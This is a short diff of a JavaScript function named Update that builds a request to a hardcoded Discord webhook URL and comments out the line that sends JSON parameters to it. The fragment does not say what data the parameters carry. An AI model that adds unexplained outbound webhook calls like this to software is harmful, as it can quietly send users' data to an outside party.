@@ -38,7 +38,7 @@ function Update()
     const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/905068408129871912/" + pass);
     request.setRequestHeader('Content-type', 'application/json');
-    request.send(JSON.stringify(params));
+    //request.send(JSON.stringify(params));
 }
 
 
